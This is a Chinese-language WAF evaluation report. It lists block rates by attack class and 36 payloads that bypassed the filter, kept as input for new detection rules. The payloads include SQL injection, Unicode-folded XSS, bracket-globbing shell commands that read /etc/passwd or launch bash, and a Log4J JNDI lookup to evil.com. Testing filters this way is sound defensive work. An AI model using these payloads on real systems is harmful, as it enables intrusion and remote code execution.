# BypassLab 对抗矩阵报告

- 样本总数：67（攻击 59 / 良性 8）
- 攻击拦截率：**39.0%**（23/59）
- 良性误报率：**12.5%**（1/8）
- 执行错误：0

## 分类拦截率

| 类别 | 拦截/总数 | 拦截率 |
|---|---|---|
| benign | 1/8 | 12% |
| path-traversal | 2/5 | 40% |
| rce | 8/30 | 27% |
| sqli | 11/17 | 65% |
| xss | 2/7 | 29% |

## 命中规则分布

| 规则 | 次数 |
|---|---|
| BL-RCE-002 | 8 |
| BL-SQLI-003 | 5 |
| BL-XSS-001 | 3 |
| BL-SQLI-001 | 2 |
| BL-TRAV-002 | 2 |
| SEM-sql:comment-stripped+sql:tautology | 2 |
| BL-SQLI-002 | 1 |
| SEM-sql:quoted-eq+sql:tautology | 1 |

## 绕过清单（36 条，W3 补规则的输入）

| 样本 | 类别 | 名称 | 载荷（截断） |
|---|---|---|---|
| CRS-942100-03 | sqli | CRS data 载体 | `-1839" or "1"="2` |
| CRS-942100-05 | sqli | CRS data 载体 | `EmptyValue' and 526=527` |
| CRS-942100-07 | sqli | CRS data 载体 | `foo')waitfor delay'5:0:20'--` |
| CRS-942100-13 | sqli | CRS data 载体 | `" | type %SystemDrive%\\config.ini | "` |
| CRS-942100-16 | sqli | IIS %u2019 best-fit 单引号 | `id=%u2019%20OR%201%3D1--%20-` |
| CRS-942100-17 | sqli | IIS %u2019 全引号变形 | `id=%u2019%20or%20%u2019a%u2019%3d%u2019a` |
| CRS-941100-02 | xss | x:script data URI | `/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22h…` |
| CRS-941100-03 | xss | UA 内 x:script | `` |
| CRS-941100-06 | xss | CRS data 载体 | `foo=<xss onbeforehellfreezes%3Daler%77(1)>` |
| CRS-941100-08 | xss | %u00ab 书名号折叠 | `/?id=%u00abscript%u00bballert(1)%u00ab/script%u00bb` |
| CRS-941100-09 | xss | %u2039 单书名号折叠 | `/?id=%u2039script%u203aalert(1)%u2039/script%u203a` |
| CRS-930100-01 | path-traversal | CRS 特征串（header 载体） | `` |
| CRS-930100-04 | path-traversal | CRS 特征串变体（header 载体） | `` |
| CRS-930100-05 | path-traversal | XML 属性 | `<?xml version="1.0"?><root><a probe="0x5c0x2e.%00/"></a></ro…` |
| CRS-932130-02 | rce | CRS data 载体 | `932130-2=${cmd}` |
| CRS-932130-06 | rce | Log4J 经 RCE 规则 | `{"foo": "${:1337:-x$}{jndi:ldap://evil.com/webshell}"}` |
| CRS-932130-08 | rce | bracket globbing [s] | `/get?cmd=cat%20/etc/pa%5Bs%5Dswd` |
| CRS-932130-09 | rce | bracket globbing [?] | `/get?cmd=cat%20/%5B%3F%5Dtc/pa%5B%3F%5Dswd` |
| CRS-932130-11 | rce | bracket [s] 直接 | `/get?s=/etc/pas%5Bs%5Dwd` |
| CRS-932130-12 | rce | 编码 bracket [p] | `/get?s=/etc/%5Bp%5Dasswd` |
| CRS-932130-13 | rce | bracket [!q] | `/get?s=/etc/%5B%21q%5Dasswd` |
| CRS-932130-14 | rce | bracket [m-z] | `/get?s=/etc/%5Bm-z%5Dasswd` |
| CRS-932130-15 | rce | bracket [u]name | `/get?s=/usr/bin/%5Bu%5Dname+-a` |
| CRS-932130-16 | rce | bracket /bi[n]/bash | `/get?exec=/bi%5Bn%5D/bash` |
| CRS-932130-17 | rce | 算术展开 $[2+2] | `/get?932130-17=$%5B2%2B2%5D` |
| CRS-932130-19 | rce | bracket 内斜杠 | `/get?932130-19=cat%20%2Fetc%2F%5Bp%2F%2F%5Dasswd` |
| CRS-932130-20 | rce | bracket 双斜杠 | `/get?932130-20=cat%20%2F%5Be%2F%2F%5Dtc%2F%5Bp%2F%2F%5Dasswd` |
| CRS-932130-21 | rce | bracket 多斜杠 | `/get?932130-21=cat%20%2F%5Be%2F%2F%2F%2F%2F%2F%2F%2F%2F%5Dtc…` |
| CRS-932130-22 | rce | bracket ls | `/get?932130-22=ls%20%2Fa%5Bb%2F%2F%2F%5Dc` |
| CRS-932130-28 | rce | 变量嵌套 ${x#{}} | `/get?var=%24%7Bx%23%7B%7D%7D` |
| CRS-932130-29 | rce | PATH 嵌套 | `/get?path=%24%7BPATH%23%7B%7D%2F%7D` |
| CRS-932130-32 | rce | 进程替换 <(cat file) | `/get?proc=%3C%28cat%20file%29` |
| CRS-932130-33 | rce | 进程替换 >(tee log) | `/get?out=%3E%28tee%20log%29` |
| CRS-932130-36 | rce | bracket [!abc] | `/get?file=%2Fetc%2F%5B%21abc%5Dasswd` |
| CRS-932130-37 | rce | bracket [e////]tc | `/get?path=%2F%5Be%2F%2F%2F%5Dtc` |
| CRS-932130-38 | rce | bracket [a-z]in | `/get?shell=%2Fusr%2F%5Ba-z%5Din%2Fbash` |

## 误报清单（1 条）

| 样本 | 名称 | 命中规则 |
|---|---|---|
| CRS-941100-05 | Referer 含 payload（CRS 不检，我们检） | BL-XSS-001 |
